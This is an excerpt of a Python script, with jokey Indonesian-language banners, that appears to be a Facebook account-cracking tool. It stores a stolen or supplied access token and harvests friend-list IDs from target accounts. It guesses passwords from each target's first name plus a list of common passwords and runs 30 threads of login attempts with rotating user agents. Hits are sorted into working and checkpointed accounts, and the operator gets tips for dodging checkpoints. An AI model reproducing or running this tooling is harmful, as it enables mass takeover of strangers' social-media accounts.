...
def banner():
	clear()
	wel = '✫╬──╬►✫☆─►WaYaHeeeeeeee NuBRooooooooOK✫╬──╬►✫☆─►'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au=' SaaaT SeeeeT NGONO Lhooo MaZseeehhhhhh'
	pengembang1=nel(au,style="green")
	cetak(nel(pengembang1, title='Kamar bojo ke 1 '))
...
def login():
		try:
			...
			try:
				...
				banner()
				li = ' WADOoOH KONEKSI INTERNET ERROR'
...
def login_lagi():
	banner()
	sky = ' ✫╬───►Ambil token dulu gasss '
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'•'+x+'] Tancaap Token  ╬─►─► : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = 'MaSooook Dek..✫╬──►✫☆─►.. ndang Ndang Saaattt seeettt ngono lho maZseeh'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		exit()
	except KeyError:
		sue = 'Wadooooh Login Gagal, TOKEN MOoDAaaR GASssss !!!'
...
def menu(my_name,my_id):
	...
	io = '\x1b[1;92m[01] Dari Pertemanan Target\n\x1b[1;92m[02] ID Akun Publik masal \n\x1b[1;92m[03] Cek Hasil Crack\n\x1b[1;92m[04] Cek Opsi Checkpoint\n\033[31m[00] Keluar'
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='Kamar bojo ke 2 hhhh'))
	...
	if jh in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] Tunggu ...')
		time.sleep(1)
		sw = ' Sat set ngono lhoooo'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = 'PILIH YANG BENER Gasss'
...
def result():
	...
	cetak(nel(kis, title='Kamar bojo rondo '))
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Cari Target Pertemanan yg di publikan dulu ')
	pil = input(x+'['+p+'f'+x+'] Masukkan ID Facebook nya : ')
	try:
		...
		teks = ' PERTEMANAN TIDAK DI PUBLIKASIKAN '
...
def dump_massal():
	...
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan fb id, yg pertemanan harus publik '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def setting():
	...
	teks = '[01] Dari Akun Old \n[02] Dari Akun Terbaru \n[03] Acak Urutan sesuai fb id'
	...
	ioz = '[01] Method B-Api \n[02] Method Mobile \n[03] Methode X Facebook '
	gess = nel(ioz, style='cyan')
	cetak(nel(gess, title='Kamar bojo ke 4 hhhh '))
	...
	aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi yg digunakan si Target (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'['+p+'f'+x+'] Tampilkan Checkpoint si target (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
# WORDLIST
def passwrd():
	ler = ' Wayaheee ngopiii..!!! --> TeKaN CTRL lalu Z TUK BERHENTI'
	sol().print(mark(ler, style='green'))
	krek = 'Live : OK/%s\nLive : CP/%s\nMainkan Mode Pesawat, sinyal lemot hasil ok dilogin jdi cp, dpt ok dilogin salah pazz coba login di crome, klo dpt cp cemua clear cookie dibrowser'%(okc,cpc)
	cetak(nel(krek, title='✫╬───►Naaah ini Kamaaar Kelon bergiliiir hhh '))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','bangsat','kontol','bintang','facebook','bismillah','katasandi','anjing','sandi123']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s ➽ %s/%s ➽hr╦╤─ OK:%s ➽mlv╦╤─ CP:%s ➽ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp1 = nel(statuscp, style='black')
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID : {idf}\n[•] PASS : {pw}'
					statusok1 = nel(statusok, style='black')
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s➽hr◣◢ %s/%s ➽◣◢ ok : %s ➽mlv◣◢ cp : %s ➽◣◢ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack3(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%shr➽╦╤─ %s/%s ➽◣◢ OK:%s ➽mlv◣◢ CP:%s ➽◣◢ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
